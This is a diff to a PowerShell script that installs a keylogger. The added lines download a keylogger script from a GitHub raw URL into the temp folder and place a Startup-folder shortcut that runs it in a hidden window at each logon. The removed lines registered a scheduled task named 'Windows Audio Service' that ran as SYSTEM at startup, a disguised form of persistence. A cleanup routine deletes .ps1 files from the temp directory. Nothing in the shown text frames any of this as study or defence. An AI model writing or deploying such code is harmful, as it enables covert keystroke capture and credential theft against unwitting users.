@@ -1,3 +1,37 @@
+# Define the path to the Startup folder
+$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+
+# Define the path for the shortcut
+$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'KeyloggerScript.lnk')
+
+# Check if the shortcut exists
+if (Test-Path $shortcutPath) {
+    Write-Output "Shortcut exists at $shortcutPath"
+} else {
+    Write-Output "Shortcut does not exist at $shortcutPath"
+
+    # Path to the keylogger script
+    $keyloggerScriptPath = "$env:TEMP\keylogger.ps1"
+
+    # URL to the keylogger script on GitHub
+    $keyloggerScriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/Keylogger.ps1"
+
+    # Download the keylogger script from GitHub
+    Invoke-WebRequest -Uri $keyloggerScriptUrl -OutFile $keyloggerScriptPath
+
+    # Create a WScript.Shell COM object
+    $wshShell = New-Object -ComObject WScript.Shell
+
+    # Create the shortcut
+    $shortcut = $wshShell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = 'powershell.exe'
+    $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$keyloggerScriptPath`""
+    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($keyloggerScriptPath)
+    $shortcut.Save()
+
+    Write-Output "Shortcut created at $shortcutPath"
+}
+
 # Function to clean up PowerShell scripts in the temp directory
 function Cleanup-TempScripts {
     Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
@@ -45,12 +79,3 @@ Write-Output "Cleanup completed. Exiting PowerShell script."
 
 # Exit the PowerShell session
 exit
-
-# Create a scheduled task to run this script at startup
-$taskName = "Windows Audio Service"
-$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$localScriptPath`""
-$taskTrigger = New-ScheduledTaskTrigger -AtStartup
-$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-
-Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings
